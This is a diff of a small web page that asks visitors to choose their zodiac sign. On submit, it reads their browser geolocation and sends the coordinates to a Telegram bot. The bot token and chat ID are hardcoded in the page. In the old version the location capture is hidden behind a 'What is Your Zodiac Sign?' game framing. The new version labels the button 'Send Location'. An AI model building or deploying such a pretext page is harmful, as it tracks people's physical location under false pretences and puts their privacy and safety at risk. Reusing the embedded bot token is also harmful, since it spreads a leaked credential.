@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zodiac Game Location</title>
+    <title>Location and Zodiac</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -24,32 +24,34 @@
 </head>
 <body>
 
-    <h2>What is Your Zodiac Sign?</h2>
+    <h2>Select Your Zodiac Sign</h2>
     <select id="zodiac" name="zodiac">
-        <option value="aries">Aries</option>
-        <option value="taurus">Taurus</option>
-        <option value="gemini">Gemini</option>
-        <option value="cancer">Cancer</option>
-        <option value="leo">Leo</option>
-        <option value="virgo">Virgo</option>
-        <option value="libra">Libra</option>
-        <option value="scorpio">Scorpio</option>
-        <option value="sagittarius">Sagittarius</option>
-        <option value="capricorn">Capricorn</option>
-        <option value="aquarius">Aquarius</option>
-        <option value="pisces">Pisces</option>
+        <option value="Aries">Aries</option>
+        <option value="Taurus">Taurus</option>
+        <option value="Gemini">Gemini</option>
+        <option value="Cancer">Cancer</option>
+        <option value="Leo">Leo</option>
+        <option value="Virgo">Virgo</option>
+        <option value="Libra">Libra</option>
+        <option value="Scorpio">Scorpio</option>
+        <option value="Sagittarius">Sagittarius</option>
+        <option value="Capricorn">Capricorn</option>
+        <option value="Aquarius">Aquarius</option>
+        <option value="Pisces">Pisces</option>
     </select>
+
     <br><br>
-    <button onclick="getLocationAndSendMessage()">Submit</button>
+    <button onclick="sendLocation()">Send Location</button>
 
     <script>
-        function getLocationAndSendMessage() {
+        function sendLocation() {
             const zodiac = document.getElementById("zodiac").value;
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    const message = `Zodiac: ${zodiac} - Location: Latitude = ${latitude}, Longitude = ${longitude}`;
+                    const message = `Zodiac: ${zodiac}, Location: Latitude = ${latitude}, Longitude = ${longitude}`;
                     sendMessageToTelegram(message);
                 }, function(error) {
                     alert("Error getting location.");
@@ -60,17 +62,17 @@
         }
 
         function sendMessageToTelegram(message) {
-            const botToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk';  // Replace with your Bot's token
-            const chatId = '397599597';      // Replace with your Chat ID
+            const botToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk';  // Your Bot Token
+            const chatId = '397599597';  // Your Chat ID
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("Location and Zodiac Sent!");
+                        alert("Location sent successfully!");
                     } else {
-                        alert("Error sending data.");
+                        alert("Error sending location.");
                     }
                 })
                 .catch(error => {
